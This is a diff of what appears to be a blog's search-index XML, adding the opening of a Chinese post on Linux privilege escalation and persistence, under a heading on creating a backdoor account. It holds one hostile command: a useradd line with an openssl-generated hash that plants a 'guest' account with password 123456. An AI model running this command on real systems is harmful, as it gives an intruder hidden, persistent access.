@@ -46,7 +46,7 @@
       <link href="2021/01/19/Linux%E6%8F%90%E6%9D%83%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"/>
       <url>2021/01/19/Linux%E6%8F%90%E6%9D%83%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/</url>
       
-        <content type="html"><![CDATA[]]></content>
+        <content type="html"><![CDATA[<h2 id="常规权限维持"><a href="#常规权限维持" class="headerlink" title="常规权限维持"></a>常规权限维持</h2><h3 id="创建后门账号"><a href="#创建后门账号" class="headerlink" title="创建后门账号"></a>创建后门账号</h3><blockquote><p>useradd -p  `openssl passwd -1 -salt ‘salt’ 123456` guest</p></blockquote>]]></content>
       
       
       <categories>
